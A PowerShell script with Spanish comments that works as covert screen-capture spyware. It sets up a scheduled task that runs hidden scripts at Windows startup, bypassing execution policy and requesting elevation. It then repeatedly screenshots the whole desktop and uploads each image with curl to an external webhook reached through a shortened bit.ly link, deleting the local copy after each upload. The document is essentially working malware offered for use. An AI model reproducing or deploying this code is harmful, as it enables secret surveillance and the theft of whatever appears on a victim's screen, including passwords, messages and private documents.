# Contenido del script
$hookurl = "https://bit.ly/Screen_dc"
$seconds = 30 # Intervalo entre capturas (en segundos)

# Detección de URL acortada
if ($hookurl.Length -ne 121) {
    Write-Host "URL del webhook acortada detectada..." 
    $hookurl = (irm $hookurl).url
}

# Obtener la ruta de la carpeta de documentos del usuario
$DocumentsFolder = [Environment]::GetFolderPath("MyDocuments")

# Ruta del script principal
$ScriptPath = Join-Path -Path $DocumentsFolder -ChildPath "sys1.ps1"

# Crear script oculto con nombre "system" en la carpeta de documentos
$ScriptContent = @"
Start-Process powershell -ArgumentList '-WindowStyle Hidden -File "$ScriptPath"' -Verb RunAs
"@
$HiddenScriptPath = Join-Path -Path $DocumentsFolder -ChildPath "system.ps1"
$ScriptContent | Out-File -FilePath $HiddenScriptPath -Encoding utf8

# Crear tarea programada
$Action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -File `"$HiddenScriptPath`""
$Trigger = New-ScheduledTaskTrigger -AtStartup
$Task = New-ScheduledTask -Action $Action -Trigger $Trigger -Description "Ejecutar script oculto al iniciar Windows"
Register-ScheduledTask -TaskName "EjecutarScriptOcultoAlIniciarWindows" -InputObject $Task -Force

# Contenido del script para enviar imágenes
$ScreenshotScriptContent = @"
$FilePath = "$env:temp\SC.png"
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
$Width = $Screen.Width
$Height = $Screen.Height
$Left = $Screen.Left
$Top = $Screen.Top
$Bitmap = New-Object System.Drawing.Bitmap $Width, $Height
$Graphic = [System.Drawing.Graphics]::FromImage($Bitmap)
$Graphic.CopyFromScreen($Left, $Top, 0, 0, $Bitmap.Size)
$Bitmap.Save($FilePath, [System.Drawing.Imaging.ImageFormat]::png)
Start-Sleep 1
curl.exe -F "file1=@$FilePath" $hookurl
Start-Sleep 1
Remove-Item -Path $FilePath
Start-Sleep $seconds
"@

# Guardar el script de envío de imágenes en la carpeta de documentos
$ScreenshotScriptPath = Join-Path -Path $DocumentsFolder -ChildPath "ScreenshotScript.ps1"
$ScreenshotScriptContent | Out-File -FilePath $ScreenshotScriptPath -Encoding utf8

# Agregar la ejecución del script de envío de imágenes al script principal
Add-Content -Path $ScriptPath -Value "`n$ScreenshotScriptContent"

Write-Host "Scripts y tarea programada creados exitosamente."

